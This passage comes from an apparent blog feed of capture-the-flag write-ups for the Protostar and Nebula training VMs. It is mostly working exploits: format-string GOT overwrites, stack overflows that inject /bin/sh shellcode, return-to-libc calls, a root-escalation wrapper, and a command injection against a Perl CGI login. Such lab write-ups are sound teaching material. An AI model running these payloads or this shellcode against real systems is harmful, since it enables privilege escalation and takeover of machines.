<p>Using <code>Global Offset Table Hijacking</code> technique, we will try to overwrite the <code>0x08049724</code> address - jmp in <code>exit()</code>, with <code>0x080484b4</code> - symbol <code>hello</code>, at offset <code>4</code>.</p>

<p>{% codeblock %}
user@protostar:~$ ruby1.9.1 ./formatter.rb 4:0x08049724:0x080484b4
ruby -e &lsquo;print [0x08049726].pack(&ldquo;V&rdquo;) + [0x08049724].pack(&ldquo;V&rdquo;) + &ldquo;%4\$2044x%4\$hn%5\$31920x%5\$hn&rdquo;&rsquo;</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x08049726].pack(&ldquo;V&rdquo;) + [0x08049724].pack(&ldquo;V&rdquo;) + &ldquo;%4\$2044x%4\$hn%5\$31920x%5\$hn&rdquo;&rsquo; | /opt/protostar/bin/format4
&hellip;
8049724code execution redirected! you win
{% endcodeblock %}</p>

<p>Correspondingly:</p>

<p>{% codeblock lang:python exploit-format4.py %}</p>

<h1>!/usr/bin/env python</h1>

<p>import sys
from libformatstr import FormatStr</p>

<p>destination   = 0x08049724
what_to_write = 0x080484b4</p>

<p>p = FormatStr()
p[destination] = what_to_write</p>

<h1>buf is 4th argument, 0 bytes are already printed</h1>

<p>sys.stdout.write(p.payload(4, start_len=0))
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ libformatstr/exploit-format4.py | /opt/protostar/bin/format4
&hellip;
AAA&amp;$code execution redirected! you win
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Stack Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/27/exploit-exercises-protostar-stack-levels/"/>
    <updated>2015-06-27T09:46:35+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/27/exploit-exercises-protostar-stack-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<p>{% codeblock %}
user@protostar:~$ wget <a href="https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt">https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt</a> &ndash;no-check-certificate -O ~/.gdbinit -q
{% endcodeblock %}</p>

<h2>Protostar Stack0</h2>

<p>{% codeblock lang:c stack0.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];</p>

<p>  modified = 0;
  gets(buffer);</p>

<p>  if(modified != 0) {
      printf(&ldquo;you have changed the &lsquo;modified&rsquo; variable\n&rdquo;);
  } else {
      printf(&ldquo;Try again?\n&rdquo;);
  }
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;\xfa&rdquo; * 64&rsquo; | ./stack0
Try again?</p>

<p>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;\xfa&rdquo; * 64 + &ldquo;\x01&rdquo;&rsquo; | ./stack0
you have changed the &lsquo;modified&rsquo; variable
{% endcodeblock %}</p>

<h2>Protostar Stack1</h2>

<p>{% codeblock lang:c stack1.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];</p>

<p>  if(argc == 1) {
      errx(1, &ldquo;please specify an argument\n&rdquo;);
  }</p>

<p>  modified = 0;
  strcpy(buffer, argv[1]);</p>

<p>  if(modified == 0x61626364) {
      printf(&ldquo;you have correctly got the variable to the right value\n&rdquo;);
  } else {
      printf(&ldquo;Try again, you got 0x%08x\n&rdquo;, modified);
  }
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64&rsquo;)
Try again, you got 0x00000000</p>

<p>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x41414141].pack(&ldquo;V&rdquo;) &rsquo;)
Try again, you got 0x41414141</p>

<p>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x61626364].pack(&ldquo;V&rdquo;) &rsquo;)
you have correctly got the variable to the right value
{% endcodeblock %}</p>

<h2>Protostar Stack2</h2>

<p>{% codeblock lang:c stack2.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char <em>*argv)
{
  volatile int modified;
  char buffer[64];
  char </em>variable;</p>

<p>  variable = getenv(&ldquo;GREENIE&rdquo;);</p>

<p>  if(variable == NULL) {
      errx(1, &ldquo;please set the GREENIE environment variable\n&rdquo;);
  }</p>

<p>  modified = 0;</p>

<p>  strcpy(buffer, variable);</p>

<p>  if(modified == 0x0d0a0d0a) {
      printf(&ldquo;you have correctly modified the variable\n&rdquo;);
  } else {
      printf(&ldquo;Try again, you got 0x%08x\n&rdquo;, modified);
  }</p>

<p>}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/opt/protostar/bin$ ./stack2
stack2: please set the GREENIE environment variable</p>

<p>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e &lsquo;print &ldquo;A&rdquo; * 64 + [0x41414141].pack(&ldquo;V&rdquo;)&rsquo;) ./stack2
Try again, you got 0x41414141</p>

<p>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e &lsquo;print &ldquo;A&rdquo; * 64 + [0x0d0a0d0a].pack(&ldquo;V&rdquo;)&rsquo;) ./stack2
you have correctly modified the variable
{% endcodeblock %}</p>

<h2>Protostar Stack3</h2>

<p>{% codeblock lang:c stack3.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>void win()
{
  printf(&ldquo;code flow successfully changed\n&rdquo;);
}</p>

<p>int main(int argc, char <em>*argv)
{
  volatile int (</em>fp)();
  char buffer[64];</p>

<p>  fp = 0;</p>

<p>  gets(buffer);</p>

<p>  if(fp) {
      printf(&ldquo;calling function pointer, jumping to 0x%08x\n&rdquo;, fp);
      fp();
  }
}
{% endcodeblock %}</p>

<p>We need to rewrite fp function address with the address of win().
{% codeblock %}
user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x41414141].pack(&ldquo;V&rdquo;)&rsquo; | ./stack3
calling function pointer, jumping to 0x41414141
Segmentation fault</p>

<p>user@protostar:/opt/protostar/bin$ nm ./stack3 | grep win
08048424 T win</p>

<p>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;X&rdquo; * 64 + [0x08048424].pack(&ldquo;V&rdquo;)&rsquo; | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
{% endcodeblock %}</p>

<h2>Protostar Stack4</h2>

<p>{% codeblock lang:c stack4.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>void win()
{
  printf(&ldquo;code flow successfully changed\n&rdquo;);
}</p>

<p>int main(int argc, char **argv)
{
  char buffer[64];</p>

<p>  gets(buffer);
}
{% endcodeblock %}</p>

<p>We use metasploit patterns (on Kali Linux) to determine the exact location of stored EIP:
{% codeblock %}</p>

<h1>Window 1:</h1>

<p>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_create.rb 80
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac</p>

<h1>Window 2:</h1>

<p>user@protostar:/opt/protostar/bin$ gdb -q ./stack4
Reading symbols from /opt/protostar/bin/stack4&hellip;done.</p>

<p>(gdb) r
Starting program: /opt/protostar/bin/stack4
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()</p>

<h1>Window 1:</h1>

<p>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x63413563
[*] Exact match at offset 76</p>

<h1>Window 2:</h1>

<p>user@protostar:/opt/protostar/bin$ nm stack4 | grep win
080483f4 T win</p>

<p>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0x080483f4].pack(&ldquo;V&rdquo;)&rsquo; | ./stack4
code flow successfully changed
{% endcodeblock %}</p>

<h2>Protostar Stack5</h2>

<p>{% codeblock lang:c stack5.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char **argv)
{
  char buffer[64];</p>

<p>  gets(buffer);
}
{% endcodeblock %}</p>

<p>The idea is the same as in Stack4, but we need to store shellcode on stack, for example.</p>

<p>Stack is executable:</p>

<p>{% codeblock %}
user@protostar:/opt/protostar/bin$ readelf -a ./stack4 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
{% endcodeblock %}</p>

<p>To have the same address in bash and gdb, we use hellman&rsquo;s fixenv tool.</p>

<p>{% codeblock %}
user@protostar:~$ git clone <a href="https://github.com/hellman/fixenv">https://github.com/hellman/fixenv</a>
Cloning into fixenv&hellip;
remote: Counting objects: 20, done.
Unpacking objects: 100% (20/20), done.
remote: Total 20 (delta 0), reused 0 (delta 0), pack-reused 20</p>

<p>user@protostar:~$ cd fixenv/</p>

<p>user@protostar:~/fixenv$ ./r.sh gdb /opt/protostar/bin/stack5
GNU gdb (GDB) 7.0.1-debian
Copyright &copy; 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &ldquo;show copying&rdquo;
and &ldquo;show warranty&rdquo; for details.
This GDB was configured as &ldquo;i486-linux-gnu&rdquo;.
For bug reporting instructions, please see:
<a href="http://www.gnu.org/software/gdb/bugs/">http://www.gnu.org/software/gdb/bugs/</a>&hellip;
Reading symbols from /home/user/fixenv/.launcher&hellip;done.</p>

<p>(gdb) set disassembly-flavor intel</p>

<p>(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 &lt;main+0>:    push   ebp
0x080483c5 &lt;main+1>:    mov    ebp,esp
0x080483c7 &lt;main+3>:    and    esp,0xfffffff0
0x080483ca &lt;main+6>:    sub    esp,0x50
0x080483cd &lt;main+9>:    lea    eax,[esp+0x10]
0x080483d1 &lt;main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 &lt;main+16>:   call   0x80482e8 &lt;gets@plt>
0x080483d9 &lt;main+21>:   leave<br/>
0x080483da &lt;main+22>:   ret  <br/>
End of assembler dump.</p>

<p>(gdb) b *0x080483d4
Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.</p>

<p>(gdb) b *0x080483d9
Breakpoint 2 at 0x80483d9: file stack5/stack5.c, line 11.</p>

<p>(gdb) r
Starting program: /home/user/fixenv/.launcher</p>

<p>Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff914) at stack5/stack5.c:10
10  stack5/stack5.c: No such file or directory.
    in stack5/stack5.c</p>

<p>(gdb) x /xw $esp
0xbffff810: 0xbffff820</p>

<p>(gdb) c
Continuing.
ABCDEFGH</p>

<p>Breakpoint 2, main (argc=1, argv=0xbffff914) at stack5/stack5.c:11
11  in stack5/stack5.c
(gdb) x /s 0xbffff820
0xbffff820:  &ldquo;ABCDEFGH&rdquo;
{% endcodeblock %}</p>

<p>The address <code>0xbffff820</code> represents the buffer[] address, we store our
shellcode here and jump to this address. Also we know, that return address is
overwritten after position 76, from Protostar Stack4. We created our shellcode
<a href="http://localhost:4000/blog/2015/06/26/ia-32-linux-shellcode-basics-2/">here</a>.</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;\x90&rdquo; * (76 - sc.length) + [0xbffff820].pack(&ldquo;V&rdquo;) &rsquo; | ./r.sh /opt/protostar/bin/stack5
user@protostar:~/fixenv$
{% endcodeblock %}</p>

<p>The shell is executed, however it receives EOF. For this purposes, we can keep it alive with <code>cat</code> command:</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ (ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;\x90&rdquo; * (76 - sc.length) + [0xbffff820].pack(&ldquo;V&rdquo;) &rsquo;; cat -) | ./r.sh /opt/protostar/bin/stack5</p>

<p>id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>

<p>Sometimes a more convenient solution could be storing shellcode in environment:</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ export EGG=$(ruby -e &lsquo;print &ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;&rsquo;)</p>

<p>user@protostar:~/fixenv$ ./r.sh getvar EGG
0xbfffff60  \x60\xff\xff\xbf  (EGG)</p>

<p>user@protostar:~/fixenv$ ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff60].pack(&ldquo;V&rdquo;)&rsquo; | ./r.sh /opt/protostar/bin/stack5
user@protostar:~/fixenv$</p>

<p>user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff60].pack(&ldquo;V&rdquo;)&rsquo; ; cat) | ./r.sh /opt/protostar/bin/stack5</p>

<p>id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>

<p>We do not need to use <code>r.sh</code> again - the EGG address could be easily calculated (albeit it&rsquo;s different, because <code>fixenv</code> clears our environment):</p>

<p>{% codeblock lang:c getenv.c %}</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char <em>argv[]) {
    char </em>ptr;</p>

<pre><code>if (argc &lt; 3) {
    printf("Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n", argv[0]);
    exit(0);
} else {
    /* Get environment variable location */
    ptr = getenv(argv[1]); 
    /* Adjust for program name */
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; 
    printf("%s will be at %p\n", argv[1], ptr);
}
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ gcc getenv.c -o getenv</p>

<p>user@protostar:~/fixenv$ ./getenv EGG /opt/protostar/bin/stack5
EGG will be at 0xbffff9b0</p>

<p>user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbffff9b0].pack(&ldquo;V&rdquo;)&rsquo; ; cat) | /opt/protostar/bin/stack5</p>

<p>id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>

<h2>Protostar Stack6</h2>

<p>{% codeblock lang:c stack6.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>void getpath()
{
  char buffer[64];
  unsigned int ret;</p>

<p>  printf(&ldquo;input path please: &rdquo;); fflush(stdout);</p>

<p>  gets(buffer);</p>

<p>  ret = __builtin_return_address(0);</p>

<p>  if((ret &amp; 0xbf000000) == 0xbf000000) {
      printf(&ldquo;bzzzt (%p)\n&rdquo;, ret);
      _exit(1);
  }</p>

<p>  printf(&ldquo;got path %s\n&rdquo;, buffer);
}</p>

<p>int main(int argc, char **argv)
{
  getpath();
}
{% endcodeblock %}</p>

<p>Using <code>pattern_create.rb</code> / <code>pattern_offset.rb</code> we found out that the stored return address is at offset 80.</p>

<p>{% codeblock %}
user@protostar:~$ gdb -q /opt/protostar/bin/stack6
&hellip;</p>

<p>gdb> b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.</p>

<p>gdb> r
&hellip;
Breakpoint 1, main (argc=0x1, argv=0xbffff804) at stack6/stack6.c:27
27  stack6/stack6.c: No such file or directory.
    in stack6/stack6.c</p>

<p>gdb> p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
{% endcodeblock %}</p>

<p>There is a great <a href="http://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf">return-to-libc writeup</a>
to explain the stack structure.</p>

<p>Address of <code>system()</code> is always the same, <code>0xb7ecffb0</code>, now we need to find the
<code>/bin/sh</code> string on the stack.</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ ./r.sh gdb /opt/protostar/bin/stack6
&hellip;
(gdb) set disassembly-flavor intel</p>

<p>(gdb) b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.</p>

<p>(gdb) r
Starting program: /home/user/fixenv/.launcher</p>

<p>(gdb) x /10s $esp
&hellip;
0xbfffff0e:  &ldquo;6:<em>.wav=00;36:</em>.axa=00;36:<em>.oga=00;36:</em>.spx=00;36:*.xspf=00;36:&rdquo;
0xbfffff4e:  &ldquo;SHELL=/bin/sh&rdquo;</p>

<p>(gdb) x /s 0xbfffff4e+6
0xbfffff54:  &ldquo;/bin/sh&rdquo;
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo;*80 + [0xb7ecffb0].pack(&ldquo;V&rdquo;) + &ldquo;FAKE&rdquo; + [0xbfffff54].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | ./r.sh /opt/protostar/bin/stack6
input path please:
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA???FAKET???
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
{% endcodeblock %}</p>

<p>Without <code>setreuid()</code> call we have only <code>euid=0</code>, so we prepare this shell wrapper:
{% codeblock lang:c escalate.c %}</p>

<h1>include &lt;stdio.h></h1>

<p>int main(int argc, char **argv)
{
        setreuid(geteuid(), geteuid());
        execv(&ldquo;/bin/sh&rdquo;, NULL);
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo;*80 + [0xb7ecffb0].pack(&ldquo;V&rdquo;) + &ldquo;FAKE&rdquo; + [0xbfffff54].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | ./r.sh /opt/protostar/bin/stack6
input path please:
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA???FAKET???
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
/tmp/escalate
id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>

<h2>Protostar Stack7</h2>

<p>{% codeblock lang:c stack7.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>char *getpath()
{
  char buffer[64];
  unsigned int ret;</p>

<p>  printf(&ldquo;input path please: &rdquo;); fflush(stdout);</p>

<p>  gets(buffer);</p>

<p>  ret = __builtin_return_address(0);</p>

<p>  if((ret &amp; 0xb0000000) == 0xb0000000) {
      printf(&ldquo;bzzzt (%p)\n&rdquo;, ret);
      _exit(1);
  }</p>

<p>  printf(&ldquo;got path %s\n&rdquo;, buffer);
  return strdup(buffer);
}</p>

<p>int main(int argc, char **argv)
{
  getpath();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ gdb -q /opt/protostar/bin/stack7
Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
Reading symbols from /opt/protostar/bin/stack7&hellip;done.
gdb> r
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9</p>

<p>Program received signal SIGSEGV, Segmentation fault.</p>

<hr />

<pre><code> eax:0804A008 ebx:B7FD7FF4  ecx:00000000  edx:00000001     eflags:00210202
 esi:00000000 edi:00000000  esp:BFFFF750  ebp:63413563     eip:37634136
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s z a p c 
</code></pre>

<p>[007B:BFFFF750]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF780 : 01 00 00 00  C0 F7 FF BF - 26 06 FF B7  B0 FA FF B7 &hellip;&hellip;..&amp;&hellip;&hellip;.
BFFFF770 : 38 41 64 39  00 FF FF FF - F4 EF FF B7  BC 82 04 08 8Ad9&hellip;&hellip;&hellip;&hellip;
BFFFF760 : 64 33 41 64  34 41 64 35 - 41 64 36 41  64 37 41 64 d3Ad4Ad5Ad6Ad7Ad
BFFFF750 : 41 63 38 41  63 39 41 64 - 30 41 64 31  41 64 32 41 Ac8Ac9Ad0Ad1Ad2A
[007B:0804A008]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
0804A008 : 41 61 30 41  61 31 41 61 - 32 41 61 33  41 61 34 41 Aa0Aa1Aa2Aa3Aa4A
0804A018 : 61 35 41 61  36 41 61 37 - 41 61 38 41  61 39 41 62 a5Aa6Aa7Aa8Aa9Ab
[0073:37634136]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
0x37634136: Error while running hook_stop:
Cannot access memory at address 0x37634136
0x37634136 in ?? ()</p>

<p>gdb> i r
eax            0x804a008    0x804a008
ecx            0x0  0x0
edx            0x1  0x1
ebx            0xb7fd7ff4   0xb7fd7ff4
esp            0xbffff750   0xbffff750
ebp            0x63413563   0x63413563
esi            0x0  0x0
edi            0x0  0x0
eip            0x37634136   0x37634136
eflags         0x210202 [ IF RF ID ]
cs             0x73 0x73
ss             0x7b 0x7b
ds             0x7b 0x7b
es             0x7b 0x7b
fs             0x0  0x0
gs             0x33 0x33
gdb> x /s $eax
0x804a008:   &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9&rdquo;
{% endcodeblock %}</p>

<p>The offset for return address is again 80 (0x37634136 in <code>pattern_offset</code>) and
<code>EAX</code> with stored <code>0x804a008</code> value points to the beginning of our buffer,
where we still can jump.</p>

<p>This is because <code>strdup()</code> allocates memory on heap and returns this address:
{% codeblock %}
man 3 strdup</p>

<p>  The strdup() function returns a pointer to a new string which is a duplicate
  of the string s.  Memory for the new string  is obtained with malloc(3), and
  can be freed with free(3).
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ (ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;X&rdquo; * (80 - sc.length) + [0x0804a008].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | /opt/protostar/bin/stack7
input path please:
got path j1X??jFX1?1?Phn/shh//bi??PS??
                                       XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX?
id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>

<p>Instead of pointing to the allocated buffer address, it is more portable to
find <code>call eax</code> instruction addresses in code and use one of them.</p>

<p>{% codeblock %}
user@protostar:~$ objdump -M intel -D /opt/protostar/bin/stack7 | grep &lsquo;call.*eax$&rsquo;
 80484bf:   ff d0                   call   eax
 80485eb:   ff d0                   call   eax
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ (ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;X&rdquo; * (80 - sc.length) + [0x080484bf].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | /opt/protostar/bin/stack7
input path please:
got path j1X??jFX1?1?Phn/shh//bi??PS??
                                       XXXXXXXXXXXXXXXXXXXXXXXXX?XXXXXXXXXXXX??
id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Nebula (16-19)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/20/exploit-exercises-nebula-16-19/"/>
    <updated>2015-06-20T11:51:41+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/20/exploit-exercises-nebula-16-19</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<h2>Level16</h2>

<p>There is a perl script running on port 1616, source:</p>

<p>{% codeblock lang:perl index.pl %}</p>

<h1>!/usr/bin/env perl</h1>

<p>use CGI qw{param};</p>

<p>print &ldquo;Content-type: text/html\n\n&rdquo;;</p>

<p>sub login {
  $username = $<em>[0];
  $password = $</em>[1];</p>

<p>  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space</p>

<p>  @output = <code>egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1</code>;
  foreach $line (@output) {
      ($usr, $pw) = split(/:/, $line);</p>

<pre><code>  if($pw =~ $password) {
      return 1;
  }
</code></pre>

<p>  }</p>

<p>  return 0;
}</p>

<p>sub htmlz {
  print(&ldquo;<html><head><title>Login resuls</title></head><body>&rdquo;);
  if($_[0] == 1) {
      print(&ldquo;Your login was accepted<br/>&rdquo;);
  } else {
      print(&ldquo;Your login failed<br/>&rdquo;);
  }  <br/>
  print(&ldquo;Would you like a cookie?<br/><br/></body></html>\n&rdquo;);
}</p>

<p>htmlz(login(param(&ldquo;username&rdquo;), param(&ldquo;password&rdquo;)));
{% endcodeblock %}</p>

<p>The service is running with flag16 privileges:
{% codeblock %}
sh-4.2$ ps auxww | grep [f]lag16
flag16    1314  0.0  0.3   2592   836 ?        Ss   Jun18   0:01 /usr/sbin/thttpd -C /home/flag16/thttpd.conf
{% endcodeblock %}</p>

<p>Clearly, there is RCE vulnerability (line 14), we can check it creating an arbitrary file:
{% codeblock %}
sh-4.2$ wget -q -O /dev/null &ldquo;<a href="http://192.168.80.136:1616/index.cgi?username=%24">http://192.168.80.136:1616/index.cgi?username=%24</a>(>abcd)&amp;password=x&rdquo;</p>

<p>sh-4.2$ ls -l /home/flag16/ABCD
-rw-rw-r&ndash; 1 flag16 flag16 0 2015-06-21 00:16 /home/flag16/ABCD
{% endcodeblock %}</p>

<p>Only problem is that input is uppercased and everything after whitespace character is stripped:
{% codeblock lang:perl %}
$username =~ tr/a-z/A-Z/; # conver to uppercase
$username =~ s/\s.*//;    # strip everything after a space</p>

<p>{% endcodeblock %}</p>

<p>We tried several other methods without success. In the later case, the shell runs, but we cannot do anything useful:
{% codeblock %}
